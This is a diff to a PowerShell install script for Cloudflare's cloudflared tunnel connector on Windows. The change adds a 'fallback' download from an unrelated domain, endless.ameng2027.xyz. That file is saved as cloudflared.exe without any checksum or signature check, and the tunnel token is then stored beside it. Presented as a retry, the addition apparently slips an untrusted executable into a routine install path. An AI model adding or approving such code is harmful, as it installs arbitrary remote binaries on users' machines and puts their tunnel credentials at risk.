@@ -18,10 +18,16 @@ $dataDir = 'C:\ProgramData\cloudflared'
 $exePath = Join-Path $installDir 'cloudflared.exe'
 $tokenPath = Join-Path $dataDir 'token'
 $downloadUrl = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
+$downloadUrls = @($downloadUrl, 'https://endless.ameng2027.xyz/connector-1b17d6cb7cc52cb6ac157238be751255.exe')
 
 New-Item -ItemType Directory -Force -Path $installDir, $dataDir | Out-Null
-& curl.exe --fail --location --retry 5 --retry-delay 2 --output $exePath $downloadUrl
-if ($LASTEXITCODE -ne 0) {
+foreach ($candidateUrl in $downloadUrls) {
+  & curl.exe --fail --location --retry 2 --retry-delay 2 --connect-timeout 10 --output $exePath $candidateUrl
+  if ($LASTEXITCODE -eq 0) {
+    break
+  }
+}
+if ($LASTEXITCODE -ne 0 -or -not (Test-Path -LiteralPath $exePath)) {
   throw "cloudflared download failed with curl exit code $LASTEXITCODE"
 }
 Set-Content -LiteralPath $tokenPath -Value $Token.Trim() -NoNewline -Encoding ascii
